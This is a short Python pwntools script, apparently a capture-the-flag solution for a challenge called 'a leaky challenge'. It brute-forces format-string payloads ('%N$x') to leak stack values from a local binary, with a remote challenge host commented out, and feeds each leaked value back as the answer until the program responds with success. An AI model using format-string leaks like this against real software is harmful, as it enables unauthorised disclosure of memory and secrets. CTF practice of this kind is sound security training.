from pwn import *
for i in range(1, 200):
  #p=remote("fitsec-a-leaky-challenge.chals.io", 443, ssl=True, sni="fitsec-a-leaky-challenge.chals.io")
  p = process("./aleakychallenge.bin")
  p.recvuntil(">>>")
  p.sendline(b"%%%d$x"%i)
  num = p.recvline().decode().strip()
  num = int(num, 16)
  p.recvuntil(">>>")
  p.sendline(b"%d"%num)
  response = p.recvall().decode()
  if "!" in response:
    print(num)
    print(response)
    break
p.interactive()
